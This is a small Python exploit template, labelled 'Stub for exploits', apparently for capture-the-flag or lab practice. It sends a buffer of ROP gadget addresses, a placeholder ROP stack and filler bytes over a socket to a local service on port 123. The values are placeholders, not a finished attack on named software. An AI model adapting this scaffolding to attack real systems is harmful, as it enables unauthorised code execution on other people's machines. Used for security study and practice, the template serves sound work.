#!/usr/bin/env python
""" Stub for exploits """

from __future__ import print_function
import logging
import socket
import struct

log = logging.getLogger(__name__)
log.addHandler(logging.StreamHandler())

# change to see more stuff
# log.setLevel(logging.INFO)
log.setLevel(logging.DEBUG)


HOST = '127.0.0.1'
PORT = 123


def do_send(what):
    log.debug("Sending: {}".format(repr(what)))
    print("Len: {}".format(len(what)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    banner = s.recv(1024)
    print(repr(banner))
    s.send(what)
    result = s.recv(1024)
    print(repr(result) + '\n')
    s.close()


def main():
    payload = ""
    payload += "\x00yaddayadda"

    # some addresses as string
    addrs = (
        # ret
        '\x47\xa5\x05\x08'  # pop esi / pop ebp / ret
        # writable: .data
        # 0x80e81a0
        + '\xa0\x81\x0e\x08'
    )

    # rop stack
    rop_stack = [
        0xcccccccc,
        0x90909090,
        0xcccccccc,
    ]

    # this to convert a string '0x41414141' into an address
    # rop_stack_int = [int(i, base=16) for i in rop_stack]
    # rop_stack_hex = struct.pack('<{}I'.format(len(rop_stack_int)),
    #                             *rop_stack_int)

    # turn to little endian
    rop_stack_le = struct.pack('<{}I'.format(len(rop_stack)), *rop_stack)
    log.debug(repr(rop_stack_le))
    addrs += rop_stack_le

    s = ''
    s += addrs + payload + '\r\n'
    do_send(s)


if __name__ == '__main__':
    main()
